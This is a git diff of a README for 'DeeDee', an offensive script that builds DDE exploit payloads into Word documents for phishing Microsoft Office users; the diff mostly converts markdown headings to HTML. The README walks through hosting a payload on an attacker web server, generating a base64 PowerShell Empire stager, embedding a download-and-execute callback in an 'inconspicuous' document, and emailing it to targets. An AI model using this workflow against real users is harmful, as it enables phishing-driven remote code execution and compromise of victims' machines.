@@ -1,6 +1,6 @@
 <h2> DeeDee Office Payload Generator<h6>Baking Evil Cookies since 2017<br>Author: True Demon</h2>
 
-##Introduction##
+<h3>Introduction##</h3>
 
 DeeDee is a script for quickly generating DDE Exploit payloads and inserting them into ready-made documents for
 phishing attempts against MS office users. The purpose of the script is to simplify and reduce the steps necessary to insert a
@@ -9,7 +9,7 @@ into the document themselves complete with known obfuscation methods to ensure a
 accomplished by inserting a reliable download script in powershell into the DDE payload, which calls out to the attacker's web
 server hosting their desired payload. Currently, Empire payloads have had the best success.
 
-##Procedure##
+<h3>Procedure</h3>
 
 Start by creating a powershell payload that you would like to run on the remote host. If you use base64 encoding, this must be
 specified in the script later. Base64 encoding is definitely recommended for successful execution. Save the payload to a txt
@@ -24,7 +24,7 @@ cp /tmp/empirepayload.txt /tmp/payloads/evil.txt
 </pre>
 
 <br/>
-<b>`use -i for your input file [default = template/blank.docx]`</b>
+<b>use -i for your input file [default = template/blank.docx]</b>
 
 <pre>
 <b>NOTE</b>: You must use the "blank.docx" file in /path/to/deedee/templates/ to start with. <br/>
@@ -33,7 +33,7 @@ before or after you have run deedee, provided that you DO NOT MODIFY THE FOOTER.
 It is recommended you edit it beforehand and save it to the templates folder so that you use it again later
 </pre>
 
-<b>`use -o to specify where you would like your output to go`</b>
+<b>use -o to specify where you would like your output to go</b>
 <pre>
 deedee@thekitchen:/# ./deedee.py -i templates/myphishing.docx -o /tmp/payloads/evilcookies.docx
 </pre>
@@ -43,14 +43,14 @@ Enter the path to your http server & empirepayload:
 Granny DeeDee bakes up some magic cookies for your enjoyment...
 and you can email the evilcookies.docx to share with your friends :)
 </pre>
-
-##Supported Techniques##
+<br/>
+<h3>Supported Techniques</h3>
 
     - Raw Powershell Payload insertion
     - Empire Web Delivery Method
 
 
-##Planned Additions##
+<h3>Planned Additions</h3>
 
     - Empire & Metasploit specific payloads
     - QUOTE-SET-REF method obfuscation
@@ -59,9 +59,9 @@ and you can email the evilcookies.docx to share with your friends :)
     - Self-starting payload delivery web server
 
 
-##Instructions##
+<h3>Instructions</h3>
 
-###USAGE###
+<h4>USAGE</h4>
 <pre>
 deedee@thekitchen:/# ./deedee.py -h
 usage: deedee.py [-h] [-i INPUT_FILE] [-o OUTPUT_FILE] [-c] [-v] [--debug]
@@ -77,14 +77,15 @@ optional arguments:
   -v, --verbose         Show verbose output
   --debug               Print debug statements
 </pre>
-###Full Example###
+<h4>Full Example</h4>
 
-##### START YOUR WEB SERVER #####
+<h5>Start Your Webserver</h5>
 <pre>
 deedee@thekitchen:/# cd /tmp/payloads
 deedee@thekitchen:/# python3 -m http.server 8443         // Remember whatever port number you use here...
 </pre>
-##### CREATE YOUR EMPIRE PAYLOAD #####
+
+<h5>Generate your malicious payload</h5>
 <pre>
 deedee@thekitchen:/# /usr/share/empire/./empire
 > listeners
@@ -100,7 +101,7 @@ deedee@thekitchen:/# /usr/share/empire/./empire
 deedee@thekitchen:/# echo "MASSIVEEMPIREPAYLOADINBASE64HERE" > /tmp/payloads/evil.txt
 </pre>
 
-Now you're ready to create your phishing document...
+<h5>Now you're ready to create your phishing document...</h5>
 <pre>
 deedee@thekitchen:/# ./deedee.py -i ~/PhishingTemplates/inconspicuous.docx -o /tmp/payloads/evilscheme.docx
 
@@ -125,7 +126,7 @@ deedee@thekitchen:/# ./deedee.py -i ~/PhishingTemplates/inconspicuous.docx -o /t
 [+] DING! The evil cookies are done!                            // SUCCESS! :)
 </pre>
 
-## Acknowledgements ##
+<h3>Acknowledgements</h3>
 <pre>
 Michael Benich @benichmt1 - Provided a lot of additional research material necessary to create this exploit
 <a href=https://sensepost.com/blog/2017/macro-less-code-exec-in-msword>Etienne Stalmans & Saif El-Sherei </a>- For their amazing, combined research efforts into DDE exploitation and obfuscation
